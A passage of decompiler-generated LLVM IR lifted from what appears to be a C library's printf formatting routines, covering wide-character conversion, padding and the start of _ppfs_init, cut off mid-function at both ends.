  br i1 %v7_13ddc, label %dec_label_pc_13df4, label %dec_label_pc_13e44

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13de4
  %v2_13df4 = load i32, i32* %v1_13bfc, align 4
  store i32 %v2_13df4, i32* %r3.global-to-local, align 4
  %v9_13df8 = icmp eq i32 %v2_13df4, 0
  store i32 %v2_13df4, i32* %stack_var_-44, align 4
  br i1 %v9_13df8, label %dec_label_pc_13f0c, label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13df4
  %v3_13e04 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13e04, i32* %r3.global-to-local, align 4
  store i32 %v2_13e08, i32* @r0, align 4
  %v5_13e14 = icmp slt i32 %v3_13e04, -1
  br i1 %v5_13e14, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_13e04
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_13e04, %bb161
  %storemerge193 = phi i32 [ %v3_13e04, %bb161 ], [ -1, %dec_label_pc_13e04 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_13e08, i32* @r1, align 4
  store i32 %v2_13e1c, i32* %r3.global-to-local, align 4
  %v0_13e20 = call i32 @__GI_wcsrtombs()
  store i32 %v0_13e20, i32* %r0.global-to-local, align 4
  %v7_13e24 = icmp eq i32 %v0_13e20, -1
  store i32 %v0_13e20, i32* @r5, align 4
  br i1 %v7_13e24, label %dec_label_pc_14070, label %dec_label_pc_13e30

dec_label_pc_13e30:                               ; preds = %bb162
  %v0_13e30 = load i32, i32* @sl, align 4
  store i32 %v0_13e30, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_13e30, i32* @r6, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13de4
  store i32 %v2_13eec, i32* %r8.global-to-local, align 4
  %v2_13e48 = load i32, i32* %v1_13bfc, align 4
  store i32 %v2_13e1c, i32* %r2.global-to-local, align 4
  store i32 %v2_13eec, i32* %r0.global-to-local, align 4
  %v3_13e54 = call i32 @__GI_wcrtomb(i32 %v2_13eec, i32 %v2_13e48, i32 %v2_13e1c)
  store i32 %v3_13e54, i32* %r0.global-to-local, align 4
  %v7_13e58 = icmp eq i32 %v3_13e54, -1
  store i32 %v3_13e54, i32* @r5, align 4
  br i1 %v7_13e58, label %dec_label_pc_14070, label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e44
  %v0_13e64 = load i32, i32* @sl, align 4
  store i32 %v0_13e64, i32* @r4, align 4
  store i32 %v2_13eec, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_13e74 = trunc i32 %v0_13e64 to i8
  %v2_13e74 = load i32, i32* %r8.global-to-local, align 4
  %v4_13e74 = add i32 %v2_13e74, %v3_13e54
  %v5_13e74 = inttoptr i32 %v4_13e74 to i8*
  store i8 %v1_13e74, i8* %v5_13e74, align 1
  %v0_13f24.pre.pre = load i32, i32* @r5, align 4
  %v1_13f24.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13f20thread-pre-split

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13ddc
  br i1 %v3_13e80, label %dec_label_pc_13ee0, label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e7c
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_13e8c = load i32, i32* %v1_13bfc, align 4
  br i1 %v7_13e7c, label %dec_label_pc_13e8c, label %dec_label_pc_13eb8

dec_label_pc_13e8c:                               ; preds = %dec_label_pc_13e84
  store i32 %v2_13e8c, i32* @r6, align 4
  %v2_13e90 = icmp eq i32 %v2_13e8c, 0
  br i1 %v2_13e90, label %dec_label_pc_13f0c, label %dec_label_pc_13e98

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e8c, %dec_label_pc_13ee8
  %v0_13ea8 = phi i32 [ %v2_13e8c, %dec_label_pc_13e8c ], [ %v3_13ef8, %dec_label_pc_13ee8 ]
  %v3_13e98 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13e98, i32* %r3.global-to-local, align 4
  %v5_13ea4 = icmp slt i32 %v3_13e98, -1
  br i1 %v5_13ea4, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_13e98
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_13e98, %bb163
  %storemerge194 = phi i32 [ %v3_13e98, %bb163 ], [ -1, %dec_label_pc_13e98 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_13ea8, i32* %r0.global-to-local, align 4
  %v1_13eac = inttoptr i32 %v0_13ea8 to i8*
  %v2_13eac = call i32 @strnlen(i8* %v1_13eac)
  store i32 %v2_13eac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f14

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e84
  store i32 %v2_13e8c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_13eec, i32* @r6, align 4
  store i32 %v2_13e8c, i32* %stack_var_-180, align 4
  br label %dec_label_pc_13f20thread-pre-split

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13e7c
  br i1 %v7_13ee0, label %dec_label_pc_13ee8, label %dec_label_pc_14070

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13ee0
  %v0_13ee8 = call i32 @__errno_location()
  store i32 %v0_13ee8, i32* %r0.global-to-local, align 4
  %v1_13ef0 = inttoptr i32 %v0_13ee8 to i32*
  %v2_13ef0 = load i32, i32* %v1_13ef0, align 4
  store i32 %v2_13ef0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_13ef8 = call i32 @__GI___glibc_strerror_r(i32 %v2_13ef0, i32 %v2_13eec, i32 128)
  store i32 %v3_13ef8, i32* %r0.global-to-local, align 4
  store i32 %v3_13ef8, i32* @r6, align 4
  br label %dec_label_pc_13e98

dec_label_pc_13f04:                               ; preds = %dec_label_pc_13d90, %.thread26, %bb160
  %v0_13f24.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_13d24, %dec_label_pc_13d90 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13f20thread-pre-split

dec_label_pc_13f0c:                               ; preds = %dec_label_pc_13e8c, %dec_label_pc_13df4
  store i32 ptrtoint ([7 x i8]* @global_var_1d254.893 to i32), i32* @r6, align 4
  br label %dec_label_pc_13f14

dec_label_pc_13f14:                               ; preds = %bb164, %dec_label_pc_13f0c
  %storemerge = phi i32 [ 6, %dec_label_pc_13f0c ], [ %v2_13eac, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13f20thread-pre-split:               ; preds = %.thread90, %dec_label_pc_13e64, %dec_label_pc_13eb8, %dec_label_pc_13f04
  %v1_13f24.pre = phi i32 [ 0, %dec_label_pc_13f04 ], [ %v1_13f24.pre.pre, %dec_label_pc_13e64 ], [ 0, %dec_label_pc_13eb8 ], [ %v2_13d90, %.thread90 ]
  %v0_13f24.pre = phi i32 [ %v0_13f24.pre81, %dec_label_pc_13f04 ], [ %v0_13f24.pre.pre, %dec_label_pc_13e64 ], [ 1, %dec_label_pc_13eb8 ], [ %v1_13d24, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_13d18, %dec_label_pc_13f04 ], [ %v0_13c44, %dec_label_pc_13e64 ], [ %v0_13c44, %dec_label_pc_13eb8 ], [ %v0_13d18, %.thread90 ]
  %v0_13f20.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f20thread-pre-split, %dec_label_pc_13e30, %dec_label_pc_13f14
  %v1_13f60 = phi i32 [ %v1_13f24.pre, %dec_label_pc_13f20thread-pre-split ], [ %v0_13e30, %dec_label_pc_13e30 ], [ 0, %dec_label_pc_13f14 ]
  %v0_13f24 = phi i32 [ %v0_13f24.pre, %dec_label_pc_13f20thread-pre-split ], [ %v0_13e20, %dec_label_pc_13e30 ], [ %storemerge, %dec_label_pc_13f14 ]
  %v0_13f2c = phi i32 [ %v0_13f20.pr, %dec_label_pc_13f20thread-pre-split ], [ 11, %dec_label_pc_13e30 ], [ 11, %dec_label_pc_13f14 ]
  %v0_13f68 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_13f20thread-pre-split ], [ %v0_13c44, %dec_label_pc_13e30 ], [ %v0_13c44, %dec_label_pc_13f14 ]
  %v7_13f20 = icmp eq i32 %v0_13f2c, 11
  %v2_13f24 = add i32 %v0_13f24, %v1_13f60
  br i1 %v7_13f20, label %dec_label_pc_13f3c, label %bb165

bb165:                                            ; preds = %dec_label_pc_13f20
  %v7_13f34 = icmp sgt i32 %v0_13f2c, 5
  %. = select i1 %v7_13f34, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_13f38 = add i32 %., %v2_13f24
  br label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f20, %bb165
  %v0_13f50 = phi i32 [ %v2_13f24, %dec_label_pc_13f20 ], [ %v2_13f38, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_13f40 = sub i32 %tmp97, %v0_13f50
  %v3_13f40 = icmp uge i32 %tmp97, %v0_13f50
  %v9_13f40 = icmp eq i32 %tmp97, %v0_13f50
  %v2_13f44 = xor i1 %v3_13f40, true
  %v3_13f44 = or i1 %v9_13f40, %v2_13f44
  br i1 %v3_13f44, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_13f3c
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_13f3c, %bb166
  %v2_13f48 = xor i1 %v9_13f40, true
  %v3_13f48 = and i1 %v3_13f40, %v2_13f48
  br i1 %v3_13f48, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_13f50.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_13f40, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_13f60 = phi i32 [ %v1_13f50.pre, %._crit_edge ], [ %v2_13f40, %bb168 ]
  %v2_13f50 = add i32 %v0_13f50, %stack_var_-336.2
  %v2_13f54 = add i32 %v2_13f50, %v2_13f60
  store i32 %v2_13f54, i32* %ip.global-to-local, align 4
  store i32 %v0_13f68, i32* %r3.global-to-local, align 4
  %v0_13f5c = load i32, i32* @sb, align 4
  %v7_13f5c = icmp eq i32 %v0_13f5c, 48
  br i1 %v7_13f5c, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_13f60 = add i32 %v2_13f60, %v1_13f60
  store i32 %v3_13f60, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_13f7c = phi i32 [ %v2_13f60, %bb169 ], [ 0, %bb170 ]
  %v1_13f68 = and i32 %v0_13f68, 8
  store i32 %v1_13f68, i32* @r8, align 4
  %v2_13f68 = icmp eq i32 %v1_13f68, 0
  br i1 %v2_13f68, label %dec_label_pc_13f74, label %dec_label_pc_13f90

dec_label_pc_13f74:                               ; preds = %.thread29
  %v0_13f74 = load i32, i32* @fp, align 4
  store i32 %v0_13f74, i32* %r0.global-to-local, align 4
  store i32 %v0_13f7c, i32* %r2.global-to-local, align 4
  %v4_13f80 = call i32 @_charpad(i32 %v0_13f74, i8 32, i32 %v0_13f7c)
  store i32 %v4_13f80, i32* %r0.global-to-local, align 4
  %v1_13f84 = load i32, i32* @sl, align 4
  %v9_13f84 = icmp eq i32 %v4_13f80, %v1_13f84
  br i1 %v9_13f84, label %dec_label_pc_13f8c, label %dec_label_pc_14070

dec_label_pc_13f8c:                               ; preds = %dec_label_pc_13f74
  %v0_13f8c = load i32, i32* @r8, align 4
  store i32 %v0_13f8c, i32* @sl, align 4
  %v0_13f98.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13f90

dec_label_pc_13f90:                               ; preds = %.thread29, %dec_label_pc_13f8c
  %v0_13f98 = phi i32 [ %v0_13f2c, %.thread29 ], [ %v0_13f98.pre, %dec_label_pc_13f8c ]
  %v0_13f94 = load i32, i32* @fp, align 4
  %v2_13f98 = add i32 %v0_13f98, ptrtoint (i32* @global_var_1d25c.895 to i32)
  store i32 %v2_13f98, i32* %r0.global-to-local, align 4
  %v2_13f9c = inttoptr i32 %v2_13f98 to i8*
  %v3_13f9c = call i32 @__GI_fputs_unlocked(i8* %v2_13f9c, i32 %v0_13f94)
  %v0_13fa0 = load i32, i32* @fp, align 4
  store i32 %v0_13fa0, i32* %r0.global-to-local, align 4
  %v0_13fa8 = load i32, i32* @r4, align 4
  store i32 %v0_13fa8, i32* %r2.global-to-local, align 4
  %v4_13fac = call i32 @_charpad(i32 %v0_13fa0, i8 48, i32 %v0_13fa8)
  store i32 %v4_13fac, i32* %r0.global-to-local, align 4
  %v1_13fb0 = load i32, i32* @r4, align 4
  %v9_13fb0 = icmp eq i32 %v4_13fac, %v1_13fb0
  br i1 %v9_13fb0, label %dec_label_pc_13fb8, label %dec_label_pc_14070

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13f90
  %v3_13fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13fb8, i32* %r3.global-to-local, align 4
  %v2_13fbc = icmp eq i32 %v3_13fb8, 0
  br i1 %v2_13fbc, label %dec_label_pc_13fcc, label %dec_label_pc_1402cthread-pre-split

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13fb8
  %v0_13fcc = load i32, i32* @r5, align 4
  %v2_13fcc = icmp eq i32 %v0_13fcc, 0
  br i1 %v2_13fcc, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_13fcc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_13fcc
  %v1_13fd4 = load i32, i32* @r6, align 4
  store i32 %v1_13fd4, i32* %r0.global-to-local, align 4
  %v1_13fdc = load i32, i32* @fp, align 4
  store i32 %v1_13fdc, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 81892, i32* @lr, align 4
  %v1_13fe0 = xor i1 %v2_13fcc, true
  call void @__pseudo_cond_branch(i1 %v1_13fe0, i32 ptrtoint (i32* @global_var_177d4.886 to i32))
  %v0_13fe4 = load i32, i32* %r0.global-to-local, align 4
  %v1_13fe4 = load i32, i32* @r5, align 4
  %v9_13fe4 = icmp eq i32 %v0_13fe4, %v1_13fe4
  br i1 %v9_13fe4, label %dec_label_pc_14044, label %dec_label_pc_14070

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_1402c
  %v2_13ff0 = icmp ult i32 %v1_13ff4, 128
  %.v1_13ff4 = select i1 %v2_13ff0, i32 %v1_13ff4, i32 128
  store i32 %.v1_13ff4, i32* @r2, align 4
  %v0_13ffc = call i32 @__GI_wcsrtombs()
  store i32 %v0_13ffc, i32* @r4, align 4
  %v2_14000 = icmp eq i32 %v0_13ffc, 0
  store i32 %v0_13ffc, i32* %r3.global-to-local, align 4
  store i32 %v2_13eec, i32* %r0.global-to-local, align 4
  %v0_14010 = load i32, i32* @fp, align 4
  store i32 %v0_14010, i32* %r2.global-to-local, align 4
  br i1 %v2_14000, label %dec_label_pc_14020, label %dec_label_pc_14018

dec_label_pc_14018:                               ; preds = %dec_label_pc_13ff0
  %v3_14018 = call i32 @__stdio_fwrite(i32 %v2_13eec, i32 %v0_13ffc, i32 %v0_14010)
  store i32 %v3_14018, i32* %r0.global-to-local, align 4
  store i32 %v3_14018, i32* %r3.global-to-local, align 4
  %v1_14020.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %dec_label_pc_13ff0, %dec_label_pc_14018
  %v1_14020 = phi i32 [ 0, %dec_label_pc_13ff0 ], [ %v1_14020.pre, %dec_label_pc_14018 ]
  %v0_14024 = phi i32 [ 0, %dec_label_pc_13ff0 ], [ %v3_14018, %dec_label_pc_14018 ]
  %v9_14020 = icmp eq i32 %v0_14024, %v1_14020
  %v1_14024 = load i32, i32* @r5, align 4
  %v2_14024 = sub i32 %v1_14024, %v0_14024
  store i32 %v2_14024, i32* @r5, align 4
  br i1 %v9_14020, label %dec_label_pc_1402c, label %dec_label_pc_14070

dec_label_pc_1402cthread-pre-split:               ; preds = %dec_label_pc_13fb8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_14030.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1402c

dec_label_pc_1402c:                               ; preds = %dec_label_pc_1402cthread-pre-split, %dec_label_pc_14020
  %v1_13ff4 = phi i32 [ %v0_14030.pr, %dec_label_pc_1402cthread-pre-split ], [ %v2_14024, %dec_label_pc_14020 ]
  store i32 %v2_13eec, i32* @r6, align 4
  %v2_14030 = icmp eq i32 %v1_13ff4, 0
  store i32 %v2_13e08, i32* @r1, align 4
  store i32 %v2_13e1c, i32* %r3.global-to-local, align 4
  store i32 %v2_13eec, i32* @r0, align 4
  br i1 %v2_14030, label %dec_label_pc_14044, label %dec_label_pc_13ff0

dec_label_pc_14044:                               ; preds = %dec_label_pc_1402c, %.thread36
  %v0_14044 = load i32, i32* @fp, align 4
  store i32 %v0_14044, i32* %r0.global-to-local, align 4
  %v0_1404c = load i32, i32* @sl, align 4
  store i32 %v0_1404c, i32* %r2.global-to-local, align 4
  %v4_14050 = call i32 @_charpad(i32 %v0_14044, i8 32, i32 %v0_1404c)
  store i32 %v4_14050, i32* %r0.global-to-local, align 4
  %v1_14054 = load i32, i32* @sl, align 4
  %v9_14054 = icmp eq i32 %v4_14050, %v1_14054
  br i1 %v9_14054, label %dec_label_pc_1405c, label %dec_label_pc_14070

dec_label_pc_1405c:                               ; preds = %dec_label_pc_14044, %dec_label_pc_13dcc, %dec_label_pc_13bf0
  %stack_var_-316.3 = phi i32 [ %v0_13c44, %dec_label_pc_13bf0 ], [ %v0_13f68, %dec_label_pc_14044 ], [ %v0_13c44, %dec_label_pc_13dcc ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_13bf0 ], [ %v2_13f54, %dec_label_pc_14044 ], [ %v2_13dd0, %dec_label_pc_13dcc ]
  %v3_1405c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_1405c, i32* @r4, align 4
  br label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_13b00, %dec_label_pc_1405c
  %v0_14060 = phi i32 [ %v0_14060.pre, %dec_label_pc_13b00 ], [ %v3_1405c, %dec_label_pc_1405c ]
  %v0_13c44 = phi i32 [ %tmp100, %dec_label_pc_13b00 ], [ %stack_var_-316.3, %dec_label_pc_1405c ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_13b00 ], [ %stack_var_-336.3, %dec_label_pc_1405c ]
  store i32 %v0_14060, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b18.outer

dec_label_pc_13b18.outer:                         ; preds = %dec_label_pc_14068, %dec_label_pc_14060
  %v5_13b44 = phi i32 [ %v1_13b74, %dec_label_pc_14068 ], [ %v0_14060, %dec_label_pc_14060 ]
  %v0_13b1849 = phi i32 [ %v1_14068, %dec_label_pc_14068 ], [ %v0_14060, %dec_label_pc_14060 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_14068 ], [ %stack_var_-336.4, %dec_label_pc_14060 ]
  %v1_13b18180 = inttoptr i32 %v0_13b1849 to i8*
  %v2_13b18181 = load i8, i8* %v1_13b18180, align 1
  %v3_13b18182 = zext i8 %v2_13b18181 to i32
  store i32 %v3_13b18182, i32* %r3.global-to-local, align 4
  %v2_13b1c183 = icmp eq i8 %v2_13b18181, 0
  br i1 %v2_13b1c183, label %dec_label_pc_13b34, label %bb126

dec_label_pc_14068:                               ; preds = %dec_label_pc_13b74
  %v1_14068 = add i32 %v0_13b7c, 2
  store i32 %v1_14068, i32* @r4, align 4
  br label %dec_label_pc_13b18.outer

dec_label_pc_14070:                               ; preds = %dec_label_pc_13ee0, %dec_label_pc_14044, %.thread36, %dec_label_pc_13f90, %dec_label_pc_13f74, %dec_label_pc_13e44, %bb162, %dec_label_pc_13da8, %bb130, %dec_label_pc_14020
  br label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %dec_label_pc_13b68, %bb, %dec_label_pc_13ae8, %dec_label_pc_14070
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_13ae8 ], [ -1, %dec_label_pc_14070 ], [ %stack_var_-336.2, %dec_label_pc_13b68 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_13aa4, i32* @r5, align 4
  store i32 %v15_13aa4, i32* %r8.global-to-local, align 4
  store i32 %v18_13aa4, i32* @sb, align 4
  store i32 %v21_13aa4, i32* @sl, align 4
  store i32 %v24_13aa4, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_14068, { 1, 0 }
  uselistorder i8 %v2_13b18181, { 1, 2, 0 }
  uselistorder i32 %v0_13b1849, { 2, 0, 1 }
  uselistorder i32 %v5_13b44, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13c44, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_14060, { 1, 0, 2 }
  uselistorder i32 %v1_13ff4, { 2, 1, 0 }
  uselistorder i32 %v0_13ffc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13f7c, { 1, 0 }
  uselistorder i32 %v2_13f60, { 2, 0, 1 }
  uselistorder i1 %v3_13f40, { 1, 0 }
  uselistorder i32 %v0_13f50, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13f24, { 1, 0 }
  uselistorder i32 %v0_13f68, { 1, 0, 2 }
  uselistorder i32 %v3_13ef8, { 1, 2, 0 }
  uselistorder i32 %v0_13ea8, { 1, 0 }
  uselistorder i32 %v2_13e8c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_13e54, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13e20, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13d24, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_13d40, { 1, 2, 3, 0 }
  uselistorder i32 %v6_13cc0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_13c24, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_13bd4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_13bcc, { 1, 0 }
  uselistorder i32 %v1_13b74, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_13b34, { 1, 0 }
  uselistorder i32 %v1_13b2c.lcssa, { 1, 0 }
  uselistorder i8 %v2_13b18, { 1, 2, 0 }
  uselistorder i32 %v2_13b2c, { 1, 2, 3, 0 }
  uselistorder i1 %v7_13d38, { 1, 0 }
  uselistorder i1 %v7_13c84, { 1, 2, 0 }
  uselistorder i1 %v7_13e7c, { 1, 0 }
  uselistorder i1 %v7_13ddc, { 1, 0 }
  uselistorder i1 %v7_13cc8, { 1, 0 }
  uselistorder i32 %v2_13e1c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13eec, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_13bfc, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_13bd0, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_13bb0, { 1, 2, 0 }
  uselistorder i32 %v4_13ba8, { 1, 0 }
  uselistorder i32 %v2_13aac, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 3, 4, 1, 2, 5, 6, 39, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 8, 7, 9, 10, 12, 11, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 1, 33, 34, 35, 36, 13, 44, 38, 37, 40, 39, 42, 41, 45, 43, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 0, 1, 3, 2 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14078, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14070, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_14060, { 1, 0 }
  uselistorder label %dec_label_pc_14020, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_13f90, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_13f3c, { 1, 0 }
  uselistorder label %dec_label_pc_13f20, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13f20thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13f14, { 1, 0 }
  uselistorder label %dec_label_pc_13f04, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_13e98, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_13c74, { 1, 0 }
  uselistorder label %dec_label_pc_13c70, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13bc8, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_13b68, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_13b34, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_14098 = load i32, i32* @r4, align 4
  store i32 %v3_14098, i32* %stack_var_-12, align 4
  %v6_14098 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_140a4 = load i32, i32* @r1, align 4
  store i32 %v0_140a4, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_140ac = bitcast i32* %arg1 to i8*
  %v3_140ac = call i32 @__GI_memset(i8* %v2_140ac, i32 0)
  %v0_140b0 = load i32, i32* @r4, align 4
  %v1_140b0 = add i32 %v0_140b0, 24
  %v2_140b0 = inttoptr i32 %v1_140b0 to i32*
  %v3_140b0 = load i32, i32* %v2_140b0, align 4
  %v1_140b4 = add i32 %v3_140b0, -1
  store i32 %v1_140b4, i32* %v2_140b0, align 4
  %v0_140bc = load i32, i32* @r5, align 4
  %v1_140bc = load i32, i32* @r4, align 4
  %v2_140bc = inttoptr i32 %v1_140bc to i32*
  store i32 %v0_140bc, i32* %v2_140bc, align 4
  %v0_140c0 = load i32, i32* @r4, align 4
  %v1_140c0 = add i32 %v0_140c0, 40
  store i32 %v1_140c0, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_140d019 = inttoptr i32 %v1_140c0 to i32*
  store i32 8, i32* %v2_140d019, align 4
  %v3_140d020 = load i32, i32* %r1.global-to-local, align 4
  %v4_140d021 = add i32 %v3_140d020, 4
  store i32 %v4_140d021, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_140c8.dec_label_pc_140c8_crit_edge

dec_label_pc_140c8.dec_label_pc_140c8_crit_edge:  ; preds = %entry, %dec_label_pc_140c8.dec_label_pc_140c8_crit_edge
